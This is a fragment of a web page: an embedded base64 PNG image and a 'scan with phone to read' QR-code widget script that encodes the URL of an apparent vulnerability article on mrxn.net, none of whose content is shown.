f4ovz0/eQvj/IlM/4mnYFxF/ritutVz6XV22F7lpXmI9YfMXIPVpD9tg91aOi8+ZwXKcuwnO+8l9PSJ3CG8XyPQQyVQi657pjxoBZ17dCmP1jr1rDrENyCK76jjzEW/3GgPB6R21cq0P8apBcXV6Uh/ggKK8PwkNQvfB6QuoU3iieHkifbv8ZznTI3dB9EB6Cq77WqcOxX70Qjj3wNb56PQo47mdN33vnIfXA9T3k9mav5acspyq677Ncn6hfhNwNK11+hfY5Qmu6Ji+qw7wXdVHfKofU64Pk3Q/hIaguWl/49B9ZFl/4d09gN5CaUgXM04TkEHx2W3Dsr2tUwLFuf5h1SA57rH4VMGv2Kq0CostD8tIq5EWIbr7Cqh0DUjdy4/qoz24gR6aL+7kT2L6HQKYJQbcAycfJ1lpdhPh6Xt4KONb1i+WtMF9heSrUCyHXKL6iuKMo7Si6F9JPHpL32q7D7FMXIbr5iNcTMp7GG6y3gfSpm/c9wnq63XuU977mkL4woz0g/CqXH9HeI1drSC84xvIchf0gdXpgzs94dRFSD1zfQ25v9lp+D4FMrd8V5v3nkO/Yfeb6INeR/xMIf6anexRh7gvJ1fve5SE+dfmeF7/9kaV44WtPYPcpq6Y0Rt8eZNoQVIfkEJRfIcTntfSZi/Ki/BHqWSEcX3Pll4fn6vqe4LgOwtt/xOsJGU/jDda7gUCmB0H32KcvL6qbdzzT9UOuC0F562HmITnc/7folVfeniuEe09gZ7OPCHz+/X03dh2OfRAeuD5l3d7stfuU5f6crrkImab5swhzXe/f894X5nqY8/JDOAie9Vzpd7667gPSvysQHmbsPvtDfOaFuz+yevGV/+wJbJ+yajpjrLYxemoNmTIEV3XyEB/MqF49K3peXMWKL83QA/M1ILl6x16vLg9zPcy5vo726ahv5K8nZDyNN1hv7yGQacNz2PfutEWY+5z5u/5sDvfrrGrcU9chtV2HmYfk1usX5UWY/fIirPXrCfGU3gS3gTjtM1ztG+apr/pYD7NfviM89o3X6bVqnYf0VIfk+la8OsQPQXnRenOx85B6uOM2EIsufO0J7AYC92nBfX22TacP9xpgKwM+v83q24RfC4gOQX3iL9sGEB/sURPMmvwZQur6tc072g9SBzN23Vwc++0GounC15zAtwfidCF3Rf8xILy+rvdcH6QOgiuf/kI9tT6KrkN6631Wh9R1/7O51xMh/YDrd1m3N3t9+wnx53HaK9QHuRv0QXJ1Ud0cjn3qhasaSK06JK+aCkgOweIqVv7SjkL/kTZycHydqv9jAxkveK1//wR2A6kpHcXZJSBTh6B+SA5Be6uL8hAfBOVF/RAd1qi315qL3QdzT3UIv8rln0WY+1XdbiBFXvG6E9gGApkWPMbVVvvdBumjv+tnvDqkDwR7H/NCazpCamHG7jvL6xpj6Ifjvnohurl1IkQHrk9Ztzd7bU/Im+3rP7ud/wEAAP//9ug/kwAAAAZJREFUAwDlV1nOKZXr+wAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-monadFileUpload-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 